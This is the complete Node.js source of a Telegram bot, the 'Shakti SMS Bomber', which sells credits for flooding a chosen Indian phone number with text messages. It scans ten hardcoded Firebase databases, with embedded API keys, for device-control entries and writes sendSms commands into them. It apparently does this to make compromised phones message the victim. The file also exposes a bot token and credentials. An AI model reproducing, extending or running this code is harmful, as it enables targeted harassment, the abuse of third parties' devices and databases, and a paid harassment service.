const TelegramBot = require('node-telegram-bot-api');
const fetch = require('node-fetch');
const fs = require('fs');
const crypto = require('crypto');

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN = '8395696352:AAGMK0ZZM5lqvV4UO9GafUFzeGAUmTqx7LY';
const OWNER_ID = 8864524240;

// ============================================================
// CLUSTERS
// ============================================================
const CLUSTERS = [
  { id: 'asif', url: 'https://asif-alam991-default-rtdb.firebaseio.com', apiKey: 'AIzaSyCq7jDPgVCae36q7F5HbdUEB9FbluM8pDs' },
  { id: 'lalit', url: 'https://lalit-847ca-default-rtdb.firebaseio.com', apiKey: 'AIzaSyCvvQcRRv7I9ZitcxvwV18fYG823bGxpFE' },
  { id: 'sunrajas', url: 'https://sunrajas-default-rtdb.firebaseio.com', apiKey: 'AIzaSyCvvQcRRv7I9ZitcxvwV18fYG823bGxpFE' },
  { id: 'goat', url: 'https://goat-100a8-default-rtdb.firebaseio.com', apiKey: 'AIzaSyB-35FYDl-4E3hpOa1LyIv0Y2SkHEHjqUE' },
  { id: 'money', url: 'https://money-ace2c-default-rtdb.firebaseio.com', apiKey: 'AIzaSyCvvQcRRv7I9ZitcxvwV18fYG823bGxpFE' },
  { id: 'tillu', url: 'https://tillu-2-default-rtdb.firebaseio.com', apiKey: 'AIzaSyCmEW2zbIUFc2U69N1HnaRMRakymUN5zl8' },
  { id: 'rex', url: 'https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app', apiKey: 'AIzaSyBa8wRzdVyXo-MSUMbnibj8qmoOor49uUY' },
  { id: 'rahkiu', url: 'https://rahkiu-1da83-default-rtdb.firebaseio.com', apiKey: 'AIzaSyBKV27Gm5t6Pddv3kCSdEZpTA31PQBkwdc' },
  { id: 'raja', url: 'https://raja-bhaiya-62-default-rtdb.firebaseio.com', apiKey: 'AIzaSyCvvQcRRv7I9ZitcxvwV18fYG823bGxpFE' },
  { id: 'alone', url: 'https://mr-alone1-default-rtdb.asia-southeast1.firebasedatabase.app', apiKey: 'AlzaSyAPvs2dufjGHFGkQXmtI-v22Cnwb3-q0p4' }
];

// ============================================================
// DATA STORAGE
// ============================================================
const DATA_FILE = 'data.json';
let data = {
  totalSmsSent: 0,
  logs: [],
  protectedNumbers: [],
  bannedUsers: [],
  users: {},
  activeBombs: {},
  redeemCodes: [],
  usedCodes: []
};

if (fs.existsSync(DATA_FILE)) {
  data = JSON.parse(fs.readFileSync(DATA_FILE));
}

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ============================================================
// BOT INIT
// ============================================================
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🔥 Shakti Credit Bot Active!');

// ============================================================
// HELPERS
// ============================================================
function isBanned(chatId) {
  return data.bannedUsers.includes(chatId);
}

function isProtected(number) {
  return data.protectedNumbers.some(p => number.includes(p));
}

function getUser(chatId) {
  if (!data.users[chatId]) {
    data.users[chatId] = {
      firstSeen: Date.now(),
      username: '',
      firstName: '',
      chatId: chatId,
      credits: 3,
      dailyBombs: 0,
      lastBombDate: null,
      plan: 'free',
      planExpiry: null,
      state: null,
      targetNumber: null
    };
    saveData();
  }
  return data.users[chatId];
}

function canBomb(chatId) {
  const user = getUser(chatId);
  const today = new Date().toDateString();

  if (user.plan !== 'free' && user.planExpiry) {
    const expiry = new Date(user.planExpiry);
    if (expiry > new Date()) {
      return { allowed: true, reason: 'unlimited' };
    } else {
      user.plan = 'free';
      user.planExpiry = null;
      user.credits = 3;
      user.dailyBombs = 0;
      saveData();
    }
  }

  if (user.lastBombDate !== today) {
    user.dailyBombs = 0;
    user.lastBombDate = today;
    saveData();
  }

  if (user.dailyBombs >= 3) {
    return { allowed: false, reason: 'daily_limit', nextReset: 'tomorrow' };
  }

  if (user.credits <= 0) {
    return { allowed: false, reason: 'no_credits' };
  }

  return { allowed: true };
}

function useBomb(chatId) {
  const user = getUser(chatId);
  const today = new Date().toDateString();

  if (user.plan !== 'free') {
    if (user.lastBombDate !== today) {
      user.dailyBombs = 0;
      user.lastBombDate = today;
    }
    user.dailyBombs++;
    saveData();
    return true;
  }

  if (user.lastBombDate !== today) {
    user.dailyBombs = 0;
    user.lastBombDate = today;
  }
  user.dailyBombs++;
  user.credits--;
  saveData();
  return true;
}

function generateRedeemCode(credits, maxUses = 1, expiresIn = 7) {
  const code = crypto.randomBytes(4).toString('hex').toUpperCase();
  const redeemCode = {
    code: code,
    credits: credits,
    maxUses: maxUses,
    usedCount: 0,
    created: Date.now(),
    expires: Date.now() + (expiresIn * 24 * 60 * 60 * 1000),
    usedBy: []
  };
  data.redeemCodes.push(redeemCode);
  saveData();
  return code;
}

function redeemCode(chatId, code) {
  const redeem = data.redeemCodes.find(r => r.code === code);
  if (!redeem) return { success: false, reason: 'invalid' };
  
  if (data.usedCodes.includes(code + '_' + chatId)) {
    return { success: false, reason: 'already_used' };
  }

  if (redeem.usedCount >= redeem.maxUses) {
    return { success: false, reason: 'max_uses' };
  }

  if (Date.now() > redeem.expires) {
    return { success: false, reason: 'expired' };
  }

  const user = getUser(chatId);
  user.credits += redeem.credits;
  redeem.usedCount++;
  redeem.usedBy.push(chatId);
  data.usedCodes.push(code + '_' + chatId);
  saveData();

  return { success: true, credits: redeem.credits };
}

// ============================================================
// FIND WEBHOOKS
// ============================================================
async function findWebhooks(cluster) {
  try {
    const url = `${cluster.url}/.json?auth=${cluster.apiKey}&shallow=true`;
    const res = await fetch(url, { timeout: 5000 });
    if (!res.ok) return [];
    const clusterData = await res.json();
    if (!clusterData || typeof clusterData !== 'object') return [];
    
    const keys = Object.keys(clusterData);
    const webhookKeys = [];
    for (const key of keys) {
      if (key === 'webhookEvent' || key === 'admin' || key.startsWith('FALCON')) {
        webhookKeys.push(key);
      }
    }
    return webhookKeys;
  } catch {
    return [];
  }
}

// ============================================================
// GET CLUSTER STATUS
// ============================================================
async function getClusterStatus() {
  const status = [];
  let totalOnline = 0;

  for (const cluster of CLUSTERS) {
    try {
      const nodes = await findWebhooks(cluster);
      const online = nodes.length;
      status.push({ id: cluster.id, online: online, reachable: true });
      totalOnline += online;
    } catch {
      status.push({ id: cluster.id, online: 0, reachable: false });
    }
  }

  return { status, totalOnline };
}

// ============================================================
// TRIGGER SMS
// ============================================================
async function triggerSms(cluster, path, number, msg) {
  try {
    const url = `${cluster.url}/${path}/sendSms.json?auth=${cluster.apiKey}`;
    const payload = {
      _nonce: `wake_${Date.now()}`,
      _wake: true,
      from: 1,
      isSended: false,
      message: msg,
      to: number
    };
    const res = await fetch(url, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      timeout: 5000
    });
    return res.ok;
  } catch {
    return false;
  }
}

// ============================================================
// BOMB FUNCTION WITH PROGRESS
// ============================================================
async function bombTarget(number, msg, chatId, bombId) {
  let totalSent = 0;
  let totalDevices = 0;
  const clusterDetails = [];
  let completedClusters = 0;
  const totalClusters = CLUSTERS.length;

  for (const cluster of CLUSTERS) {
    // Check if bomb was stopped
    if (data.activeBombs[bombId] && data.activeBombs[bombId].stopped) {
      return { stopped: true, totalDevices, totalSent, clusterDetails };
    }

    try {
      const nodes = await findWebhooks(cluster);
      if (nodes.length === 0) {
        completedClusters++;
        const progress = Math.round((completedClusters / totalClusters) * 100);
        updateProgress(chatId, bombId, progress, totalSent);
        clusterDetails.push({ cluster: cluster.id, devicesFound: 0, sent: 0 });
        continue;
      }

      totalDevices += nodes.length;
      let sent = 0;

      for (const node of nodes) {
        // Check stop again inside loop
        if (data.activeBombs[bombId] && data.activeBombs[bombId].stopped) {
          return { stopped: true, totalDevices, totalSent, clusterDetails };
        }

        try {
          const success = await triggerSms(cluster, node, number, msg);
          if (success) sent++;
        } catch {}
        await new Promise(r => setTimeout(r, 30));
      }

      totalSent += sent;
      completedClusters++;
      const progress = Math.round((completedClusters / totalClusters) * 100);
      updateProgress(chatId, bombId, progress, totalSent);
      clusterDetails.push({ cluster: cluster.id, devicesFound: nodes.length, sent: sent });
    } catch {
      completedClusters++;
      clusterDetails.push({ cluster: cluster.id, devicesFound: 0, sent: 0, error: true });
    }
  }

  return { stopped: false, totalDevices, totalSent, clusterDetails };
}

// ============================================================
// UPDATE PROGRESS
// ============================================================
async function updateProgress(chatId, bombId, progress, sent) {
  if (data.activeBombs[bombId]) {
    data.activeBombs[bombId].progress = progress;
    data.activeBombs[bombId].sent = sent;
    saveData();
    
    // Send progress update every 5%
    const lastProgress = data.activeBombs[bombId].lastProgress || 0;
    if (progress - lastProgress >= 5 || progress === 100) {
      data.activeBombs[bombId].lastProgress = progress;
      
      // Progress bar
      const barLength = 20;
      const filled = Math.round((progress / 100) * barLength);
      const empty = barLength - filled;
      const bar = '█'.repeat(filled) + '░'.repeat(empty);
      
      try {
        await bot.editMessageText(
          `⏳ *Bombing in progress...*\n\n${bar} ${progress}%\n📨 SMS Sent: ${sent}\n\nPress Stop to cancel:`,
          {
            chat_id: chatId,
            message_id: data.activeBombs[bombId].progressMsgId,
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: '⏹️ Stop Bombing', callback_data: `stop_${bombId}` }]
              ]
            }
          }
        );
      } catch {}
    }
  }
}

// ============================================================
// USER MENU
// ============================================================
function showUserMenu(chatId) {
  const user = getUser(chatId);
  const today = new Date().toDateString();
  
  let creditsDisplay = `🎫 Credits: ${user.credits}`;
  if (user.plan !== 'free') {
    const expiry = new Date(user.planExpiry);
    const daysLeft = Math.ceil((expiry - new Date()) / (1000 * 60 * 60 * 24));
    creditsDisplay = `👑 ${user.plan.toUpperCase()} (${daysLeft}d left)`;
  }
  
  const dailyLeft = user.lastBombDate === today ? Math.max(0, 3 - user.dailyBombs) : 3;
  const planInfo = user.plan === 'free' ? `📊 Daily Bombs Left: ${dailyLeft}` : '♾️ Unlimited Bombs';

  const keyboard = {
    reply_markup: {
      keyboard: [
        [{ text: '💣 Start Bombing' }],
        [{ text: '🎫 My Credits' }, { text: '🎁 Redeem Code' }],
        [{ text: '💰 Buy Credits' }],
        [{ text: '❓ Help' }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    }
  };
  
  bot.sendMessage(chatId, `
🔥 *Shakti SMS Bomber*

${creditsDisplay}
${planInfo}

Select an option:
  `, { 
    parse_mode: 'Markdown',
    ...keyboard 
  });
}

// ============================================================
// ADMIN MENU
// ============================================================
function showAdminMenu(chatId) {
  const keyboard = {
    reply_markup: {
      keyboard: [
        [{ text: '💣 Start Bombing' }],
        [{ text: '🎫 My Credits' }, { text: '🎁 Redeem Code' }],
        [{ text: '💰 Buy Credits' }],
        [{ text: '🔧 Admin Panel' }],
        [{ text: '❓ Help' }]
      ],
      resize_keyboard: true,
      one_time_keyboard: false
    }
  };
  bot.sendMessage(chatId, '👑 *Shakti SMS Bomber (Admin)*\n\nSelect an option:', { 
    parse_mode: 'Markdown',
    ...keyboard 
  });
}

// ============================================================
// ADMIN PANEL
// ============================================================
async function showAdminPanel(chatId) {
  const statusData = await getClusterStatus();
  
  let response = `
👑 *Admin Panel*

📊 *Real-Time Status*

🟢 Online Devices: ${statusData.totalOnline}

*Cluster Breakdown:*
`;

  for (const c of statusData.status) {
    const icon = c.reachable ? '🟢' : '🔴';
    response += `  ${icon} ${c.id}: ${c.online} online\n`;
  }

  response += `
📨 *Total SMS Sent:* ${data.totalSmsSent}
👥 *Total Users:* ${Object.keys(data.users).length}
🚫 *Banned Users:* ${data.bannedUsers.length}
📋 *Protected Numbers:* ${data.protectedNumbers.length}
🎫 *Total Redeem Codes:* ${data.redeemCodes.length}

*Options:*
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🔄 Refresh Status', callback_data: 'refresh_status' }],
        [{ text: '👥 All Users', callback_data: 'list_users' }],
        [{ text: '➕ Add Protected', callback_data: 'add_protected' }],
        [{ text: '🚫 Ban User', callback_data: 'ban_user' }],
        [{ text: '✅ Unban User', callback_data: 'unban_user' }],
        [{ text: '📋 View Logs', callback_data: 'view_logs' }],
        [{ text: '📊 Live Bombing', callback_data: 'live_bombing' }],
        [{ text: '🎫 Generate Redeem Code', callback_data: 'gen_code' }],
        [{ text: '📋 Redeem Codes List', callback_data: 'list_codes' }],
        [{ text: '🗑️ Clear Logs', callback_data: 'clear_logs' }],
        [{ text: '📊 Full Stats', callback_data: 'full_stats' }],
        [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
      ]
    }
  };

  bot.sendMessage(chatId, response, { 
    parse_mode: 'Markdown',
    ...keyboard 
  });
}

// ============================================================
// TEXT HANDLER
// ============================================================
bot.on('text', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  const isAdmin = (chatId == OWNER_ID);
  const user = getUser(chatId);

  if (isBanned(chatId)) {
    return bot.sendMessage(chatId, '🚫 You are banned from using this bot.');
  }

  if (!data.users[chatId]) {
    user.username = msg.from.username || 'unknown';
    user.firstName = msg.from.first_name || '';
    saveData();
  }

  // ===== STATES =====

  if (user.state === 'waiting_number') {
    if (!/^\d{10}$/.test(text)) {
      return bot.sendMessage(chatId, '⚠️ Invalid! Enter 10 digits only.\nExample: 9999999999');
    }
    
    if (isProtected(text)) {
      return bot.sendMessage(chatId, '🔒 This number is protected! Cannot bomb.');
    }
    
    const check = canBomb(chatId);
    if (!check.allowed) {
      let msg = '⛔ Cannot bomb!\n\n';
      if (check.reason === 'daily_limit') {
        msg += '📊 Daily limit (3) reached. Try again tomorrow.';
      } else if (check.reason === 'no_credits') {
        msg += '🎫 No credits left! Buy credits or redeem a code.';
      }
      user.state = null;
      saveData();
      return bot.sendMessage(chatId, msg);
    }
    
    user.targetNumber = text;
    user.state = 'waiting_message';
    saveData();
    
    return bot.sendMessage(chatId, `📝 *Enter message to send:*\n\nTarget: +91${text}\n\nSend your message:`, { 
      parse_mode: 'Markdown' 
    });
  }

  if (user.state === 'waiting_message') {
    const number = user.targetNumber;
    const fullNumber = `+91${number}`;
    const message = text;
    
    user.state = null;
    saveData();
    
    const bombId = `bomb_${Date.now()}`;
    
    // Send initial progress message
    const progressMsg = await bot.sendMessage(chatId, 
      `⏳ *Bombing in progress...*\n\n████████████████████ 0%\n📨 SMS Sent: 0\n\nPress Stop to cancel:`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '⏹️ Stop Bombing', callback_data: `stop_${bombId}` }]
          ]
        }
      }
    );
    
    data.activeBombs[bombId] = {
      chatId: chatId,
      number: fullNumber,
      message: message,
      startTime: Date.now(),
      progress: 0,
      sent: 0,
      progressMsgId: progressMsg.message_id,
      stopped: false,
      active: true
    };
    saveData();
    
    try {
      const result = await bombTarget(fullNumber, message, chatId, bombId);
      
      if (result.stopped) {
        await bot.editMessageText(
          `⏹️ *Bombing Stopped!*

📱 Target: ${fullNumber}
💬 Message: ${message}
📡 Devices Used: ${result.totalDevices}
📨 SMS Sent: ${result.totalSent}

⚠️ Bombing was stopped by user.`,
          {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown'
          }
        );
        delete data.activeBombs[bombId];
        saveData();
        if (isAdmin) showAdminMenu(chatId); else showUserMenu(chatId);
        return;
      }
      
      delete data.activeBombs[bombId];
      
      // Use bomb (deduct credit/daily)
      useBomb(chatId);
      
      let response = `
✅ *Bombing Complete!*

📱 Target: ${fullNumber}
💬 Message: ${message}
📡 Devices Used: ${result.totalDevices}
📨 SMS Sent: ${result.totalSent}
      `;

      if (result.clusterDetails.some(c => c.sent > 0)) {
        response += '\n*Cluster Breakdown:*\n';
        result.clusterDetails.forEach(c => {
          if (c.sent > 0) {
            response += `  🔹 ${c.cluster}: ${c.sent} SMS\n`;
          }
        });
      }
      
      const updatedUser = getUser(chatId);
      if (updatedUser.plan === 'free') {
        const today = new Date().toDateString();
        const left = updatedUser.lastBombDate === today ? Math.max(0, 3 - updatedUser.dailyBombs) : 3;
        response += `\n📊 Remaining daily bombs: ${left}\n🎫 Credits left: ${updatedUser.credits}`;
      } else {
        const expiry = new Date(updatedUser.planExpiry);
        const daysLeft = Math.ceil((expiry - new Date()) / (1000 * 60 * 60 * 24));
        response += `\n👑 ${updatedUser.plan.toUpperCase()} (${daysLeft}d remaining)`;
      }
      
      await bot.editMessageText(response, {
        chat_id: chatId,
        message_id: progressMsg.message_id,
        parse_mode: 'Markdown'
      });
      
    } catch (error) {
      bot.sendMessage(chatId, '❌ Error: ' + error.message);
    }
    
    if (isAdmin) {
      showAdminMenu(chatId);
    } else {
      showUserMenu(chatId);
    }
    return;
  }

  if (user.state === 'waiting_redeem') {
    const result = redeemCode(chatId, text.toUpperCase());
    user.state = null;
    saveData();
    
    if (result.success) {
      bot.sendMessage(chatId, `✅ Code redeemed! +${result.credits} credits added.`);
    } else {
      const messages = {
        'invalid': '❌ Invalid code!',
        'already_used': '❌ Code already used by you!',
        'max_uses': '❌ Code has reached maximum uses!',
        'expired': '❌ Code has expired!'
      };
      bot.sendMessage(chatId, messages[result.reason] || '❌ Failed to redeem.');
    }
    
    if (isAdmin) showAdminMenu(chatId); else showUserMenu(chatId);
    return;
  }

  if (user.state === 'gen_code_credits') {
    const credits = parseInt(text);
    if (isNaN(credits) || credits <= 0) {
      return bot.sendMessage(chatId, '⚠️ Enter valid number.');
    }
    user.genCredits = credits;
    user.state = 'gen_code_uses';
    saveData();
    bot.sendMessage(chatId, '📊 Enter max uses for this code (1-100):');
    return;
  }

  if (user.state === 'gen_code_uses') {
    const uses = parseInt(text);
    if (isNaN(uses) || uses <= 0 || uses > 100) {
      return bot.sendMessage(chatId, '⚠️ Enter valid number (1-100).');
    }
    user.genUses = uses;
    user.state = 'gen_code_days';
    saveData();
    bot.sendMessage(chatId, '📅 Enter expiry days (1-30):');
    return;
  }

  if (user.state === 'gen_code_days') {
    const days = parseInt(text);
    if (isNaN(days) || days <= 0 || days > 30) {
      return bot.sendMessage(chatId, '⚠️ Enter valid number (1-30).');
    }
    
    const code = generateRedeemCode(user.genCredits, user.genUses, days);
    user.state = null;
    saveData();
    
    bot.sendMessage(chatId, `
✅ *Redeem Code Generated!*

🔑 Code: \`${code}\`
🎫 Credits: ${user.genCredits}
👥 Max Uses: ${user.genUses}
📅 Expires: ${days} days

Share this code with users!
    `, { parse_mode: 'Markdown' });
    
    showAdminPanel(chatId);
    return;
  }

  if (user.state === 'add_protected') {
    if (!/^\d{10}$/.test(text)) {
      return bot.sendMessage(chatId, '⚠️ Enter 10 digits only.');
    }
    if (data.protectedNumbers.includes(text)) {
      return bot.sendMessage(chatId, '⚠️ Already protected!');
    }
    data.protectedNumbers.push(text);
    user.state = null;
    saveData();
    bot.sendMessage(chatId, `✅ ${text} added to protected list!`);
    showAdminPanel(chatId);
    return;
  }

  if (user.state === 'ban_user') {
    const userId = parseInt(text);
    if (isNaN(userId)) {
      return bot.sendMessage(chatId, '⚠️ Enter valid numeric Chat ID.');
    }
    if (data.bannedUsers.includes(userId)) {
      return bot.sendMessage(chatId, '⚠️ User already banned!');
    }
    data.bannedUsers.push(userId);
    user.state = null;
    saveData();
    bot.sendMessage(chatId, `✅ User ${userId} banned!`);
    showAdminPanel(chatId);
    return;
  }

  if (user.state === 'unban_user') {
    const userId = parseInt(text);
    if (isNaN(userId)) {
      return bot.sendMessage(chatId, '⚠️ Enter valid numeric Chat ID.');
    }
    const index = data.bannedUsers.indexOf(userId);
    if (index === -1) {
      return bot.sendMessage(chatId, '⚠️ User not found in ban list.');
    }
    data.bannedUsers.splice(index, 1);
    user.state = null;
    saveData();
    bot.sendMessage(chatId, `✅ User ${userId} unbanned!`);
    showAdminPanel(chatId);
    return;
  }

  // ===== MAIN MENU =====

  if (text === '💣 Start Bombing') {
    user.state = 'waiting_number';
    saveData();
    
    const keyboard = {
      reply_markup: {
        keyboard: [
          [{ text: '❌ Cancel' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    };
    
    return bot.sendMessage(chatId, `
📱 *Enter target phone number*

Format: 9876543210 (10 digits)
Example: 9999999999

Send number or tap Cancel:
    `, { parse_mode: 'Markdown', ...keyboard });
  }

  if (text === '🎫 My Credits') {
    const today = new Date().toDateString();
    let response = `
🎫 *Your Credits & Plan*

`;

    if (user.plan !== 'free') {
      const expiry = new Date(user.planExpiry);
      const daysLeft = Math.ceil((expiry - new Date()) / (1000 * 60 * 60 * 24));
      response += `👑 *Plan:* ${user.plan.toUpperCase()}\n📅 Expires: ${expiry.toLocaleDateString()} (${daysLeft}d left)\n♾️ Unlimited bombs\n\n`;
    } else {
      response += `🎫 *Credits:* ${user.credits}\n`;
      const dailyLeft = user.lastBombDate === today ? Math.max(0, 3 - user.dailyBombs) : 3;
      response += `📊 *Daily Bombs Left:* ${dailyLeft}/3\n\n`;
    }

    response += `🕐 Last Reset: ${user.lastBombDate || 'First time'}`;
    
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    return;
  }

  if (text === '🎁 Redeem Code') {
    user.state = 'waiting_redeem';
    saveData();
    bot.sendMessage(chatId, '🔑 Enter your redeem code:\n(Or send /cancel)');
    return;
  }

  if (text === '💰 Buy Credits') {
    bot.sendMessage(chatId, `
💳 *Buy Credits & Plans*

*Credit Packs:*
🎫 10 Credits - ₹50
🎫 25 Credits - ₹100
🎫 50 Credits - ₹180
🎫 100 Credits - ₹300

*Unlimited Plans:*
👑 7 Days Unlimited - ₹150
👑 15 Days Unlimited - ₹250
👑 30 Days Unlimited - ₹400

*Contact Admin for payment and activation.*
    `, { parse_mode: 'Markdown' });
    return;
  }

  if (text === '❌ Cancel') {
    user.state = null;
    saveData();
    bot.sendMessage(chatId, '❌ Cancelled.');
    if (isAdmin) showAdminMenu(chatId); else showUserMenu(chatId);
    return;
  }

  if (text === '🔧 Admin Panel') {
    if (!isAdmin) {
      return bot.sendMessage(chatId, '⛔ Admin only!');
    }
    return showAdminPanel(chatId);
  }

  if (text === '❓ Help') {
    bot.sendMessage(chatId, `
🔥 *Shakti SMS Bomber*

*Free Users:*
- 3 bombs per day (FREE)
- 1 bomb = 1 credit
- Redeem codes for extra credits

*Plans:*
- 7/15/30 days unlimited

*How to use:*
1. Click 💣 Start Bombing
2. Enter 10-digit number
3. Enter message
4. Watch progress 0% → 100%

*Commands:*
/start - Main menu
    `, { parse_mode: 'Markdown' });
    return;
  }

  if (!text.startsWith('/')) {
    bot.sendMessage(chatId, '❓ Unknown option. Use menu buttons.');
    if (isAdmin) showAdminMenu(chatId); else showUserMenu(chatId);
  }
});

// ============================================================
// CALLBACKS
// ============================================================
bot.on('callback_query', async (callback) => {
  const chatId = callback.message.chat.id;
  const data_cb = callback.data;

  // Stop Bombing
  if (data_cb.startsWith('stop_')) {
    const bombId = data_cb.replace('stop_', '');
    if (data.activeBombs[bombId]) {
      data.activeBombs[bombId].stopped = true;
      saveData();
      bot.answerCallbackQuery(callback.id, { text: '⏹️ Stopping bombing...' });
    } else {
      bot.answerCallbackQuery(callback.id, { text: '❌ No active bombing found.' });
    }
    return;
  }

  if (data_cb === 'refresh_status') {
    bot.answerCallbackQuery(callback.id);
    await showAdminPanel(chatId);
    return;
  }

  if (data_cb === 'back_menu') {
    bot.answerCallbackQuery(callback.id);
    if (chatId == OWNER_ID) {
      showAdminMenu(chatId);
    } else {
      showUserMenu(chatId);
    }
    return;
  }

  if (data_cb === 'add_protected') {
    bot.answerCallbackQuery(callback.id);
    const user = getUser(chatId);
    user.state = 'add_protected';
    saveData();
    bot.sendMessage(chatId, '📱 Enter 10-digit number to protect:');
    return;
  }

  if (data_cb === 'ban_user') {
    bot.answerCallbackQuery(callback.id);
    const user = getUser(chatId);
    user.state = 'ban_user';
    saveData();
    
    let list = '👥 *All Users:*\n\n';
    for (const [id, u] of Object.entries(data.users)) {
      const banned = data.bannedUsers.includes(parseInt(id));
      list += `${banned ? '🚫' : '✅'} ID: \`${id}\` - ${u.firstName} (@${u.username})\n`;
    }
    list += '\nSend Chat ID to ban:';
    bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
    return;
  }

  if (data_cb === 'unban_user') {
    bot.answerCallbackQuery(callback.id);
    const user = getUser(chatId);
    user.state = 'unban_user';
    saveData();
    
    if (data.bannedUsers.length === 0) {
      return bot.sendMessage(chatId, '📭 No banned users.');
    }
    
    let list = '🚫 *Banned Users:*\n\n';
    data.bannedUsers.forEach(id => {
      const u = data.users[id];
      list += `📱 ID: ${id} - ${u ? u.firstName : 'Unknown'}\n`;
    });
    list += '\nSend Chat ID to unban:';
    bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
    return;
  }

  if (data_cb === 'view_logs') {
    bot.answerCallbackQuery(callback.id);
    if (data.logs.length === 0) return bot.sendMessage(chatId, '📭 No logs.');
    
    let response = '📋 *Recent Logs:*\n\n';
    data.logs.slice(-10).reverse().forEach(log => {
      const u = data.users[log.user];
      response += `
📱 ${log.number}
👤 ${u ? u.firstName : log.user}
💬 "${log.message}"
📨 ${log.sent} SMS
🕐 ${new Date(log.timestamp).toLocaleString()}
---\n`;
    });
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    return;
  }

  if (data_cb === 'clear_logs') {
    bot.answerCallbackQuery(callback.id);
    data.logs = [];
    saveData();
    bot.sendMessage(chatId, '✅ Logs cleared!');
    showAdminPanel(chatId);
    return;
  }

  if (data_cb === 'full_stats') {
    bot.answerCallbackQuery(callback.id);
    const status = await getClusterStatus();
    let response = `
📊 *Full Stats*

🟢 Online: ${status.totalOnline}
📨 Total SMS: ${data.totalSmsSent}
👥 Users: ${Object.keys(data.users).length}
🚫 Banned: ${data.bannedUsers.length}
🎫 Codes: ${data.redeemCodes.length}
🔴 Active Bombs: ${Object.keys(data.activeBombs).length}

*Cluster:*
`;
    status.status.forEach(c => {
      response += `  ${c.reachable ? '🟢' : '🔴'} ${c.id}: ${c.online}\n`;
    });
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    return;
  }

  if (data_cb === 'live_bombing') {
    bot.answerCallbackQuery(callback.id);
    if (Object.keys(data.activeBombs).length === 0) {
      return bot.sendMessage(chatId, '📭 No active bombs.');
    }
    let response = '🔴 *Active Bombs:*\n\n';
    for (const [id, bomb] of Object.entries(data.activeBombs)) {
      const u = data.users[bomb.chatId];
      const elapsed = Math.floor((Date.now() - bomb.startTime) / 1000);
      response += `
📱 ${bomb.number}
👤 ${u ? u.firstName : bomb.chatId}
💬 "${bomb.message}"
📊 ${bomb.progress || 0}%
📨 ${bomb.sent || 0} SMS
⏱️ ${elapsed}s
---\n`;
    }
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    return;
  }

  if (data_cb === 'list_users') {
    bot.answerCallbackQuery(callback.id);
    let response = '👥 *All Users:*\n\n';
    for (const [id, u] of Object.entries(data.users)) {
      const banned = data.bannedUsers.includes(parseInt(id));
      response += `${banned ? '🚫' : '✅'} \`${id}\` - ${u.firstName} (@${u.username})\n`;
    }
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    return;
  }

  if (data_cb === 'gen_code') {
    bot.answerCallbackQuery(callback.id);
    const user = getUser(chatId);
    user.state = 'gen_code_credits';
    saveData();
    bot.sendMessage(chatId, '🎫 Enter credits for this code:');
    return;
  }

  if (data_cb === 'list_codes') {
    bot.answerCallbackQuery(callback.id);
    if (data.redeemCodes.length === 0) {
      return bot.sendMessage(chatId, '📭 No codes generated.');
    }
    let response = '🎫 *Redeem Codes:*\n\n';
    data.redeemCodes.forEach(r => {
      const status = r.usedCount >= r.maxUses ? '❌' : '✅';
      response += `${status} \`${r.code}\` - ${r.credits} credits (${r.usedCount}/${r.maxUses})\n`;
    });
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
    return;
  }
});

// ============================================================
// COMMANDS
// ============================================================
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  getUser(chatId);
  if (chatId == OWNER_ID) {
    showAdminMenu(chatId);
  } else {
    showUserMenu(chatId);
  }
});

bot.onText(/\/admin/, (msg) => {
  const chatId = msg.chat.id;
  if (chatId != OWNER_ID) return bot.sendMessage(chatId, '⛔ Admin only!');
  showAdminPanel(chatId);
});

bot.onText(/\/cancel/, (msg) => {
  const chatId = msg.chat.id;
  const user = getUser(chatId);
  user.state = null;
  saveData();
  bot.sendMessage(chatId, '❌ Cancelled.');
  if (chatId == OWNER_ID) {
    showAdminMenu(chatId);
  } else {
    showUserMenu(chatId);
  }
});

// ============================================================
// SAVE DATA
// ============================================================
process.on('SIGINT', () => {
  saveData();
  console.log('Data saved. Exiting...');
  process.exit();
});

console.log('✅ Bot is running!');
